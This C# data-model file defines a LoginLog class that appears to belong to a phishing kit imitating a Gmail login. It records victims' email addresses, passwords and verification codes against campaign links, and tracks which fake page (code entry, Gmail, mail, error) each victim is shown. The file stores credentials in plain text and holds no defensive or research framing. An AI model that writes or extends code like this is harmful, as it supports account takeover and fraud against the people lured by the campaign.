namespace GmailApp.Models;

public class LoginLog
{
    public int Id { get; set; }
    public string Email { get; set; } = string.Empty;
    public string Password { get; set; } = string.Empty;
    public string Code { get; set; } = string.Empty;
    public DateTime CreatedAt { get; set; } = DateTime.UtcNow;
    public int? CampaignLinkId { get; set; }
    public CampaignLink? CampaignLink { get; set; }
    /// <summary>0=Loading 1=Code 2=GmailApp 3=Mail 4=Error</summary>
    public int PageMode { get; set; }
}
